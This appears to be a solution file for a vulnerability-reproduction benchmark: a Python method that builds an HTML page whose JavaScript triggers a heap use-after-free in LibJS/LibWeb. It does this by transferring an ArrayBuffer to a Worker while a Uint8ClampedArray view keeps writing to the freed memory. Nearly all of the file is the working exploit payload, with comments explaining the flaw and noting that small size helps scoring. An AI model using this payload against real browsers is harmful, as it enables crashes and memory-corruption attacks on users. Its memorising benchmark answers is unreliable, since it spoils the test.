import textwrap

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a Heap Use After Free
        vulnerability in LibJS/LibWeb.

        The vulnerability exists because Uint8ClampedArray was implemented as a
        custom class and did not inherit from the TypedArray prototype. As a result,
        it was not correctly handled by mechanisms that operate on TypedArrays.

        Specifically, when an ArrayBuffer is transferred to another context (like a
        Worker) via `postMessage`, all its associated TypedArray views are supposed
        to be "neutered". This means they are detached from the buffer, and any
        subsequent access to them will throw a TypeError.

        Because the vulnerable Uint8ClampedArray implementation was not recognized
        as a TypedArray, it bypassed this neutering logic. This PoC exploits this
        flaw by:
        1. Creating an ArrayBuffer and a Uint8ClampedArray view of it.
        2. Transferring the ArrayBuffer to a Worker, which detaches the buffer in
           the main thread and makes its memory eligible for garbage collection.
        3. The Uint8ClampedArray view in the main thread is not neutered and is
           left with a dangling pointer to the freed memory.
        4. Accessing this view (e.g., by writing to it) then constitutes a
           Use-After-Free, which is caught by memory sanitizers like ASan,
           resulting in a crash.
        """

        # A minimal and direct JavaScript payload to trigger the UAF.
        # It avoids complex heap spraying, as a simple write to the freed
        # region is sufficient for a sanitizer to detect the vulnerability.
        # This results in a small PoC size, which is favorable for scoring.
        js_payload = textwrap.dedent("""
            try {
                // A common allocation size, e.g., a memory page.
                const size = 4096;
                let buffer = new ArrayBuffer(size);
                
                // The vulnerable view that will retain a dangling pointer.
                let uaf_view = new Uint8ClampedArray(buffer);

                // A Worker provides a separate execution context and heap.
                const worker_code = `self.onmessage = () => { postMessage('done'); };`;
                const blob = new Blob([worker_code], {type: 'application/javascript'});
                const worker = new Worker(URL.createObjectURL(blob));

                // This callback executes after the buffer has been successfully
                // transferred to the worker.
                worker.onmessage = (e) => {
                    // At this point, the buffer's memory is managed by the worker's
                    // GC and is considered free from the main thread's perspective.
                    // This write access uses the dangling pointer in `uaf_view`.
                    for (let i = 0; i < uaf_view.length; i++) {
                        uaf_view[i] = 0x41; // Use-After-Free
                    }
                };

                // Initiate the transfer. This neuters `buffer` in the main thread
                // but fails to neuter `uaf_view` in the vulnerable version.
                worker.postMessage(buffer, [buffer]);
            } catch (e) {
                // In a patched, non-vulnerable version, the access above would
                // throw a TypeError, which might be caught here. In the
                // vulnerable version, a crash is expected instead.
            }
        """)

        # The HTML document that embeds the JavaScript payload.
        html_template = textwrap.dedent("""
        <!DOCTYPE html>
        <html>
        <head>
            <title>PoC</title>
        </head>
        <body>
            <script>
            {js_code}
            </script>
        </body>
        </html>
        """)

        poc_content = html_template.format(js_code=js_payload)
        
        return poc_content.encode('utf-8')
